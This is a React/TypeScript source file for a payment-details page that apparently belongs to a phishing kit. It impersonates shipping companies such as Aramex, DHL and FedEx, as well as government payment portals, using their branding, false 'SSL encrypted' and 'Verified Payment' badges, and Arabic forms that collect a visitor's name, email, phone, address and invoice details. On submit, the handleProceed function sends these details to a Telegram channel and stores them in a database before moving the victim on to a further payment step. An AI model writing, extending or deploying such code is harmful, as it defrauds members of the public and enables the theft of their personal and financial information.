import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getShippingCompanyDesign } from "@/lib/shippingCompanyDesigns";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck, FileText, DollarSign, Landmark } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import BrandedCarousel from "@/components/BrandedCarousel";
import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
import PageLoader from "@/components/PageLoader";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService, getAllGovernmentServices } from "@/lib/governmentPaymentServices";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { getServiceVisualIdentity, getVisualIdentityByType } from "@/lib/paymentVisualSystems";
import CustomPaymentHeader from "@/components/CustomPaymentHeader";
import CustomPaymentCard from "@/components/CustomPaymentCard";
import CustomPaymentInput from "@/components/CustomPaymentInput";
import CustomPaymentButton from "@/components/CustomPaymentButton";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";
import ShippingCompanyHeader from "@/components/ShippingCompanyHeader";

const PaymentRecipient = () => {
  const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError, error } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [selectedGovService, setSelectedGovService] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPage, setShowPage] = useState(false);
  
  const allGovServices = getAllGovernmentServices();

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) {
      setShowPage(true);
    }
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
  const titleParam = urlParams.get('title');
  const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
  const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
  const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
  const countryParam = urlParams.get('country') || urlParams.get('c');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyDesign = getShippingCompanyDesign(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const companyMeta = getCompanyMeta(serviceKey);
  
  const isShippingCompany = ['aramex', 'dhl', 'fedex', 'ups', 'smsa', 'naqel', 'zajil'].includes(serviceKey.toLowerCase());

  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const shippingInfo = linkData?.payload as Record<string, unknown>;
  const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
  
  const currencyCode = currencyParam || shippingInfo?.currency_code || "SAR";
  const inferredCountryFromCurrency = getCountryByCurrency(currencyCode);
  
  const countryCode = countryParam || inferredCountryFromCurrency || shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  
  const isGovService = isGovernmentService(serviceKey);
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  // Apply payment gateway visuals for non-government services
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(countryCode, serviceKey) : null;

  const rawAmount = amountParam || shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل بيانات الدفع..." />;
  }

  if (isError) {
    console.error('Error loading link:', error);
  }

  const formattedAmount = formatCurrency(amount, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
  
  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
  const displayLogo = entityLogo || branding.logo;
  
  const linkType = linkData?.type || 'payment';
  const serviceVisual = isGovService ? null : getVisualIdentityByType(linkType);
  
  const primaryColor = isGovService ? govSystem.colors.primary : (gatewayVisuals?.colors.primary || companyDesign.colors.primary || serviceVisual?.colors.primary || companyBranding?.colors.primary || branding.colors.primary);
  const secondaryColor = isGovService ? govSystem.colors.secondary : (gatewayVisuals?.colors.secondary || companyDesign.colors.secondary || serviceVisual?.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary);
  const surfaceColor = isGovService ? govSystem.colors.surface : (gatewayVisuals?.colors.surface || companyDesign.colors.surface || serviceVisual?.colors.background || companyBranding?.colors.surface || '#F8F9FA');
  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (gatewayVisuals?.fonts.primaryAr || companyDesign.fonts.primaryAr || serviceVisual?.fonts.primary || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif');
  
  const countryGovServices = allGovServices.filter(s => s.country === countryCode);
  
  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.append('form-name', 'payment-recipient');
      formData.append('name', customerName);
      formData.append('email', customerEmail);
      formData.append('phone', customerPhone);
      formData.append('address', residentialAddress);
      formData.append('service', serviceName);
      formData.append('amount', formattedAmount);
      formData.append('linkId', id || '');
      if (isGovService) {
        formData.append('invoiceNumber', invoiceNumber);
        formData.append('govService', selectedGovService);
        formData.append('paymentAmount', paymentAmount);
      }

      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(formData as any).toString()
        });
      } catch (error) {
        console.error('Form submission error:', error);
      }

      const productionDomain = window.location.origin;
      try {
        await sendToTelegram({
          type: 'payment_recipient',
          data: {
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            address: residentialAddress,
            service: serviceName,
            amount: formattedAmount,
            ...(isGovService && {
              invoiceNumber: invoiceNumber,
              govService: selectedGovService,
              paymentAmount: paymentAmount
            }),
            payment_url: `${productionDomain}/pay/${id}/details`
          },
          timestamp: new Date().toISOString()
        });
      } catch (error) {
        console.error('Telegram error:', error);
      }

      if (linkData) {
        try {
          const customerData = {
            ...linkData.payload,
            customerInfo: {
              name: customerName,
              email: customerEmail,
              phone: customerPhone,
              address: residentialAddress,
              service: serviceName,
              amount: formattedAmount,
              ...(isGovService && {
                invoiceNumber: invoiceNumber,
                govService: selectedGovService,
                paymentAmount: paymentAmount
              })
            },
            selectedCountry: countryCode,
            service_key: serviceKey,
            service_name: serviceName
          };

          await updateLink.mutateAsync({
            id: id!,
            payload: customerData
          });
        } catch (error) {
          console.error('Update link error:', error);
        }
      }

      navigate(`/pay/${id}/details`);
    } catch (error) {
      console.error('Error:', error);
      setIsSubmitting(false);
    }
  };
  
  if (isGovService) {
    const GovLayout = getGovernmentLayout(countryCode);
    
    return (
      <>
        <PaymentMetaTags 
          serviceKey={serviceKey}
          serviceName={serviceName}
          title={dynamicTitle}
          customDescription={dynamicDescription}
          amount={formattedAmount}
        />
        
        <GovLayout 
          countryCode={countryCode} 
          serviceName={govSystem.nameAr || serviceName}
          amount={paymentAmount ? formatCurrency(parseFloat(paymentAmount), currencyCode) : undefined}
        >
          <form onSubmit={handleProceed} className="space-y-5">
            <div className="space-y-4">
              {/* Full Name */}
              <div>
                <Label 
                  htmlFor="name" 
                  className="block text-sm font-semibold mb-2"
                  style={{ color: govSystem.colors.text }}
                >
                  الاسم الكامل
                </Label>
                <Input
                  id="name"
                  value={customerName}
                  onChange={(e) => setCustomerName(e.target.value)}
                  required
                  className="h-12 border-gray-300 focus:border-primary rounded-md"
                  style={{ borderRadius: govSystem.borderRadius.sm }}
                  placeholder="الاسم الثلاثي"
                />
              </div>
              
              {/* Email */}
              <div>
                <Label 
                  htmlFor="email" 
                  className="block text-sm font-semibold mb-2"
                  style={{ color: govSystem.colors.text }}
                >
                  البريد الإلكتروني
                </Label>
                <Input
                  id="email"
                  type="email"
                  value={customerEmail}
                  onChange={(e) => setCustomerEmail(e.target.value)}
                  required
                  className="h-12 border-gray-300 focus:border-primary rounded-md"
                  style={{ borderRadius: govSystem.borderRadius.sm }}
                  placeholder="example@email.com"
                  dir="ltr"
                />
              </div>
              
              {/* Phone */}
              <div>
                <Label 
                  htmlFor="phone" 
                  className="block text-sm font-semibold mb-2"
                  style={{ color: govSystem.colors.text }}
                >
                  رقم الهاتف
                </Label>
                <Input
                  id="phone"
                  type="tel"
                  value={customerPhone}
                  onChange={(e) => setCustomerPhone(e.target.value)}
                  required
                  className="h-12 border-gray-300 focus:border-primary rounded-md"
                  style={{ borderRadius: govSystem.borderRadius.sm }}
                  placeholder={`${phoneCode} ${phonePlaceholder}`}
                  dir="ltr"
                />
              </div>
              
              {/* Invoice Number - For Government Services Only */}
              <div>
                <Label 
                  htmlFor="invoiceNumber" 
                  className="block text-sm font-semibold mb-2"
                  style={{ color: govSystem.colors.text }}
                >
                  الرقم المفوتر
                </Label>
                <Input
                  id="invoiceNumber"
                  value={invoiceNumber}
                  onChange={(e) => setInvoiceNumber(e.target.value)}
                  required
                  className="h-12 border-gray-300 focus:border-primary rounded-md"
                  style={{ borderRadius: govSystem.borderRadius.sm }}
                  placeholder="رقم الفاتورة / المرجع"
                />
              </div>

              {/* Government Service Selector */}
              <div>
                <Label 
                  htmlFor="govService" 
                  className="block text-sm font-semibold mb-2"
                  style={{ color: govSystem.colors.text }}
                >
                  نوع الخدمة
                </Label>
                <Select value={selectedGovService} onValueChange={setSelectedGovService} required>
                  <SelectTrigger 
                    className="h-12 border-gray-300 focus:border-primary rounded-md"
                    style={{ borderRadius: govSystem.borderRadius.sm }}
                  >
                    <SelectValue placeholder="اختر الخدمة" />
                  </SelectTrigger>
                  <SelectContent>
                    {countryGovServices.map((service) => (
                      <SelectItem key={service.key} value={service.key}>
                        {service.nameAr}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Payment Amount */}
              <div>
                <Label 
                  htmlFor="paymentAmount" 
                  className="block text-sm font-semibold mb-2"
                  style={{ color: govSystem.colors.text }}
                >
                  مبلغ السداد
                </Label>
                <Input
                  id="paymentAmount"
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  required
                  className="h-12 border-gray-300 focus:border-primary rounded-md"
                  style={{ borderRadius: govSystem.borderRadius.sm }}
                  placeholder="أدخل المبلغ"
                  step="0.01"
                  min="0"
                />
              </div>
            </div>
          
            {/* Submit Button */}
            <Button
              type="submit"
              disabled={
                isSubmitting || 
                !customerName || 
                !customerEmail || 
                !customerPhone || 
                !invoiceNumber || 
                !selectedGovService || 
                !paymentAmount
              }
              className="w-full h-12 text-base font-bold mt-6 shadow-md hover:shadow-lg transition-all"
              style={{
                background: govSystem.gradients.primary,
                borderRadius: govSystem.borderRadius.md,
                color: govSystem.colors.textOnPrimary
              }}
            >
              {isSubmitting ? "جاري المعالجة..." : "متابعة للدفع"}
            </Button>
          </form>
          
          {/* Hidden Netlify Form */}
          <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
            <input type="text" name="name" />
            <input type="email" name="email" />
            <input type="tel" name="phone" />
            <input type="text" name="address" />
            <input type="text" name="service" />
            <input type="text" name="amount" />
            <input type="text" name="linkId" />
            <input type="text" name="invoiceNumber" />
            <input type="text" name="govService" />
            <input type="text" name="paymentAmount" />
          </form>
        </GovLayout>
      </>
    );
  }

  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={dynamicTitle}
        customDescription={dynamicDescription}
        amount={formattedAmount}
      />

      {isShippingCompany ? (
        <>
        <ShippingCompanyHeader
          companyKey={serviceKey}
          serviceName={serviceName}
          showSecurityBadge={true}
        />
        <div 
          className="w-full py-4 text-center text-white font-bold text-sm sm:text-base"
          style={{
            background: `linear-gradient(90deg, ${companyDesign.colors.secondary}, ${companyDesign.colors.primary}, ${companyDesign.colors.secondary})`,
            boxShadow: 'inset 0 2px 4px rgba(0,0,0,0.1)'
          }}
        >
          📦 خدمة الشحن والتوصيل السريع - {companyDesign.nameAr}
        </div>
        </>
      ) : serviceVisual ? (
        <CustomPaymentHeader
          visual={serviceVisual}
          serviceName={serviceName}
          logo={displayLogo}
          showSecurityBadge={true}
        />
      ) : (
        <div 
          className="sticky top-0 z-50 w-full shadow-2xl"
          style={{
            background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
            borderBottom: `5px solid ${primaryColor}`,
          }}
        >
          <div className="container mx-auto px-4 sm:px-6">
            <div className="flex items-center justify-between h-16 sm:h-20">
              <div className="flex items-center gap-3 sm:gap-5">
                {displayLogo && (
                  <div className="bg-white/20 backdrop-blur-sm p-2 sm:p-3 rounded-xl">
                    <img 
                      src={displayLogo} 
                      alt={serviceName}
                      className="h-10 sm:h-14 w-auto object-contain brightness-0 invert"
                    />
                  </div>
                )}
                <div className="text-white">
                  <h2 className="text-base sm:text-xl font-black">
                    {serviceName}
                  </h2>
                  <p className="text-xs sm:text-sm opacity-95 font-semibold">
                    🔒 بوابة الدفع الآمن
                  </p>
                </div>
              </div>
              
              <div className="flex items-center gap-2 px-3 sm:px-4 py-2 rounded-full bg-white/30 backdrop-blur-md border border-white/40 shadow-lg">
                <ShieldCheck className="w-4 h-4 sm:w-5 sm:h-5 text-white" />
                <span className="text-xs sm:text-sm font-bold text-white">دفع آمن</span>
                <Lock className="w-3 h-3 sm:w-4 sm:h-4 text-white" />
              </div>
            </div>
          </div>
        </div>
      )}

      {isShippingCompany && companyDesign.headerImage ? (
        <div className="w-full relative">
          <img
            src={companyDesign.headerImage}
            alt={serviceName}
            className="w-full h-56 sm:h-72 md:h-80 object-cover"
            onError={(e) => e.currentTarget.style.display = 'none'}
          />
          <div
            className="absolute inset-0 bg-gradient-to-t from-black/40 via-transparent to-transparent"
          />
          <div className="absolute bottom-0 left-0 right-0 p-6 text-white">
            <h2 className="text-2xl sm:text-3xl font-black mb-2" style={{ textShadow: '0 2px 10px rgba(0,0,0,0.5)' }}>
              {serviceName}
            </h2>
            <p className="text-sm sm:text-base font-semibold" style={{ textShadow: '0 1px 5px rgba(0,0,0,0.5)' }}>
              خدمات الشحن والتوصيل السريع 🚀
            </p>
          </div>
        </div>
      ) : (!isShippingCompany && !serviceVisual) ? (
        <BrandedCarousel
          serviceKey={serviceKey}
          className="mb-0"
          countryCode={countryCode}
          isGovService={isGovService}
        />
      ) : null}

      {/* Main Content */}
      <div 
        className="min-h-screen py-6 sm:py-8"
        dir="rtl"
        style={{
          background: isShippingCompany 
            ? `linear-gradient(135deg, ${companyDesign.colors.background}, ${companyDesign.colors.surface})` 
            : serviceVisual 
              ? serviceVisual.gradients.background 
              : `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
          fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : (serviceVisual ? serviceVisual.fonts.primary : fontFamily)
        }}
      >
        <div className="container mx-auto px-3 sm:px-4 max-w-2xl">
          <div className="text-center mb-8">
            <div className="inline-flex items-center gap-3 mb-4 px-6 py-3 rounded-full" style={{ background: `${primaryColor}10`, border: `2px solid ${primaryColor}30` }}>
              <Package className="w-5 h-5" style={{ color: primaryColor }} />
              <span className="text-sm font-bold" style={{ color: primaryColor }}>
                {isShippingCompany ? 'خدمة الشحن' : 'خدمة الدفع'}
              </span>
            </div>
            <h1 
              className="text-2xl sm:text-4xl font-black mb-3"
              style={{
                color: isShippingCompany ? companyDesign.colors.primary : (serviceVisual ? serviceVisual.colors.primary : primaryColor),
                fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : (serviceVisual ? serviceVisual.fonts.primary : fontFamily),
                fontWeight: isShippingCompany ? (companyDesign.fonts.weight?.bold || 900) : (serviceVisual ? serviceVisual.fonts.headingWeight : '900'),
                letterSpacing: '-0.02em'
              }}
            >
              {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
            </h1>
            <p 
              className="text-xs sm:text-sm mb-4"
              style={{
                color: isShippingCompany ? companyDesign.colors.text : (serviceVisual ? serviceVisual.colors.textSecondary : '#6B7280'),
                fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : (serviceVisual ? serviceVisual.fonts.secondary : fontFamily),
                opacity: 0.8
              }}
            >
              الرجاء إدخال بياناتك لإكمال عملية الدفع
            </p>
            
            {/* Amount Display */}
            {rawAmount && (
              <div 
                className="inline-flex items-center gap-2 px-5 py-3 rounded-full font-bold shadow-lg" 
                style={{ 
                  background: isShippingCompany 
                    ? companyDesign.gradients.primary 
                    : serviceVisual 
                      ? serviceVisual.gradients.button 
                      : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                  color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF',
                  boxShadow: isShippingCompany 
                    ? companyDesign.shadows.md 
                    : serviceVisual 
                      ? serviceVisual.ui.shadows.md 
                      : '0 4px 12px rgba(0,0,0,0.15)',
                  borderRadius: isShippingCompany 
                    ? (companyDesign.borderRadius.xl || '9999px') 
                    : serviceVisual 
                      ? serviceVisual.ui.borderRadius.xl 
                      : '9999px',
                  fontSize: '16px',
                  fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : fontFamily
                }}
              >
                <DollarSign className="w-5 h-5" />
                <span>{formattedAmount}</span>
              </div>
            )}
          </div>

          {serviceVisual ? (
            <CustomPaymentCard visual={serviceVisual} className="max-w-2xl mx-auto">

              <form onSubmit={handleProceed} className="space-y-6">
                <CustomPaymentInput
                  visual={serviceVisual!}
                  label="الاسم الكامل *"
                  icon={<User className="w-4 h-4" />}
                  value={customerName}
                  onChange={(e) => setCustomerName(e.target.value)}
                  required
                  placeholder="أدخل اسمك الكامل"
                />
                
                <CustomPaymentInput
                  visual={serviceVisual!}
                  label="البريد الإلكتروني *"
                  icon={<Mail className="w-4 h-4" />}
                  type="email"
                  value={customerEmail}
                  onChange={(e) => setCustomerEmail(e.target.value)}
                  required
                  placeholder="example@email.com"
                  dir="ltr"
                />
                
                <CustomPaymentInput
                  visual={serviceVisual!}
                  label="رقم الهاتف *"
                  icon={<Phone className="w-4 h-4" />}
                  type="tel"
                  value={customerPhone}
                  onChange={(e) => setCustomerPhone(e.target.value)}
                  required
                  placeholder={`${phoneCode} ${phonePlaceholder}`}
                  dir="ltr"
                />
                
                <CustomPaymentInput
                  visual={serviceVisual!}
                  label="العنوان السكني *"
                  icon={<MapPin className="w-4 h-4" />}
                  value={residentialAddress}
                  onChange={(e) => setResidentialAddress(e.target.value)}
                  required
                  placeholder="أدخل عنوانك السكني الكامل"
                />

                {/* Security Notice */}
                <div 
                  className="flex items-center gap-3 p-4 rounded-xl"
                  style={{
                    background: serviceVisual ? `${serviceVisual.colors.primary}08` : `${primaryColor}08`,
                    border: serviceVisual ? `1.5px solid ${serviceVisual.colors.primary}30` : `1px solid ${primaryColor}30`,
                    borderRadius: serviceVisual ? serviceVisual.ui.borderRadius.lg : '12px'
                  }}
                >
                  <div 
                    className="flex-shrink-0 w-10 h-10 rounded-full flex items-center justify-center"
                    style={{
                      background: serviceVisual ? serviceVisual.gradients.primary : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                    }}
                  >
                    <Shield className="w-5 h-5 text-white" />
                  </div>
                  <div className="flex-1">
                    <p 
                      className="text-sm font-bold mb-0.5" 
                      style={{ 
                        color: serviceVisual ? serviceVisual.colors.text : designSystem.colors.neutral[900],
                        fontFamily: serviceVisual ? serviceVisual.fonts.primary : fontFamily
                      }}
                    >
                      بياناتك محمية بالكامل
                    </p>
                    <p 
                      className="text-xs"
                      style={{ color: serviceVisual ? serviceVisual.colors.textSecondary : '#6B7280' }}
                    >
                      جميع معلوماتك مشفرة بتقنية SSL/TLS المتقدمة
                    </p>
                  </div>
                </div>
                <CustomPaymentButton
                  visual={serviceVisual!}
                  type="submit"
                  disabled={isSubmitting || !customerName || !customerEmail || !customerPhone || !residentialAddress}
                  loading={isSubmitting}
                  variant="primary"
                  size="lg"
                  className="w-full mt-2"
                  icon={<ArrowLeft className="w-5 h-5" />}
                  iconPosition="right"
                >
                  متابعة للدفع
                </CustomPaymentButton>
              </form>
            </CustomPaymentCard>
          ) : (
            <Card 
              className="overflow-hidden border-2"
              style={{
                borderRadius: isShippingCompany ? companyDesign.borderRadius.lg : '16px',
                boxShadow: isShippingCompany ? companyDesign.shadows.lg : '0 10px 40px rgba(0,0,0,0.12)',
                borderColor: primaryColor,
                borderTop: `6px solid ${primaryColor}`
              }}
            >
              <form onSubmit={handleProceed} className="px-5 sm:px-8 py-6 sm:py-8 bg-white">
                <div className="space-y-5">
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                      <User className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                      الاسم الكامل *
                    </Label>
                    <Input id="name" value={customerName} onChange={(e) => setCustomerName(e.target.value)} required className="h-12 sm:h-14 text-base border-2 transition-all focus:border-opacity-100" style={{ borderRadius: isShippingCompany ? companyDesign.borderRadius.md : '12px', borderColor: `${primaryColor}30`, fontFamily: fontFamily, fontSize: '16px' }} placeholder="أدخل اسمك الكامل" />
                  </div>
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                      <Mail className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                      البريد الإلكتروني *
                    </Label>
                    <Input id="email" type="email" value={customerEmail} onChange={(e) => setCustomerEmail(e.target.value)} required className="h-12 sm:h-14 text-base border-2 transition-all focus:border-opacity-100" style={{ borderRadius: isShippingCompany ? companyDesign.borderRadius.md : '12px', borderColor: `${primaryColor}30`, fontFamily: fontFamily, fontSize: '16px' }} placeholder="example@email.com" dir="ltr" />
                  </div>
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                      <Phone className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                      رقم الهاتف *
                    </Label>
                    <Input id="phone" type="tel" value={customerPhone} onChange={(e) => setCustomerPhone(e.target.value)} required className="h-12 sm:h-14 text-base border-2 transition-all focus:border-opacity-100" style={{ borderRadius: isShippingCompany ? companyDesign.borderRadius.md : '12px', borderColor: `${primaryColor}30`, fontFamily: fontFamily, fontSize: '16px' }} placeholder={`${phoneCode} ${phonePlaceholder}`} dir="ltr" />
                  </div>
                  <div>
                    <Label htmlFor="address" className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                      <MapPin className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                      العنوان السكني *
                    </Label>
                    <Input id="address" value={residentialAddress} onChange={(e) => setResidentialAddress(e.target.value)} required className="h-12 sm:h-14 text-base border-2 transition-all focus:border-opacity-100" style={{ borderRadius: isShippingCompany ? companyDesign.borderRadius.md : '12px', borderColor: `${primaryColor}30`, fontFamily: fontFamily, fontSize: '16px' }} placeholder="أدخل عنوانك السكني الكامل" />
                  </div>
                </div>
                <div className="mt-5 p-4 sm:p-5 rounded-xl flex items-start gap-3" style={{ background: `${primaryColor}08`, border: `2px solid ${primaryColor}20`, borderRadius: isShippingCompany ? companyDesign.borderRadius.lg : '16px' }}>
                  <div className="flex-shrink-0 w-10 h-10 rounded-full flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                    <Shield className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-sm font-bold mb-1" style={{ color: designSystem.colors.neutral[900] }}>🔒 بياناتك محمية بالكامل</p>
                    <p className="text-xs text-gray-600 leading-relaxed">جميع معلوماتك الشخصية والمالية محمية بأعلى معايير التشفير SSL/TLS 256-bit المعتمدة عالمياً</p>
                  </div>
                </div>
                <Button type="submit" disabled={isSubmitting || !customerName || !customerEmail || !customerPhone || !residentialAddress} className="w-full text-base sm:text-lg py-5 sm:py-6 text-white font-bold mt-6 transition-all hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100" style={{ background: isShippingCompany ? companyDesign.gradients.primary : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`, boxShadow: isShippingCompany ? companyDesign.shadows.lg : `0 8px 30px -8px ${primaryColor}80`, borderRadius: isShippingCompany ? companyDesign.borderRadius.lg : '12px' }}>
                  {isSubmitting ? <span>جاري المعالجة...</span> : <><span className="ml-2">متابعة للدفع</span><ArrowLeft className="w-5 h-5 mr-2" /></>}
                </Button>
                <p className="text-xs text-center text-gray-500 mt-4">🔒 جميع المعاملات مشفرة وآمنة</p>
              </form>
            </Card>
          )}
            
            {/* Hidden Netlify Form */}
            <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
              <input type="text" name="name" />
              <input type="email" name="email" />
              <input type="tel" name="phone" />
              <input type="text" name="address" />
              <input type="text" name="service" />
              <input type="text" name="amount" />
              <input type="text" name="linkId" />
            </form>

          {/* Footer */}
          <div className="mt-10 text-center">
            <div 
              className="inline-flex items-center gap-6 px-6 py-3 rounded-full mb-4"
              style={{
                background: serviceVisual ? `${serviceVisual.colors.primary}05` : 'rgba(0,0,0,0.02)',
                border: serviceVisual ? `1px solid ${serviceVisual.colors.border}` : '1px solid #E5E7EB',
                borderRadius: serviceVisual ? serviceVisual.ui.borderRadius.xl : '9999px'
              }}
            >
              <div className="flex items-center gap-2">
                <div 
                  className="w-6 h-6 rounded-full flex items-center justify-center"
                  style={{ background: serviceVisual ? serviceVisual.colors.success : '#10B981' }}
                >
                  <Lock className="w-3.5 h-3.5 text-white" />
                </div>
                <span 
                  className="text-xs font-semibold"
                  style={{ color: serviceVisual ? serviceVisual.colors.text : '#374151' }}
                >
                  SSL Encrypted
                </span>
              </div>
              <div className="w-px h-6" style={{ background: serviceVisual ? serviceVisual.colors.border : '#E5E7EB' }} />
              <div className="flex items-center gap-2">
                <div 
                  className="w-6 h-6 rounded-full flex items-center justify-center"
                  style={{ background: serviceVisual ? serviceVisual.colors.primary : primaryColor }}
                >
                  <ShieldCheck className="w-3.5 h-3.5 text-white" />
                </div>
                <span 
                  className="text-xs font-semibold"
                  style={{ color: serviceVisual ? serviceVisual.colors.text : '#374151' }}
                >
                  Verified Payment
                </span>
              </div>
            </div>
            <p 
              className="text-xs"
              style={{ 
                color: serviceVisual ? serviceVisual.colors.textSecondary : '#9CA3AF',
                fontFamily: serviceVisual ? serviceVisual.fonts.secondary : fontFamily
              }}
            >
              © 2025 {serviceName}. جميع الحقوق محفوظة.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
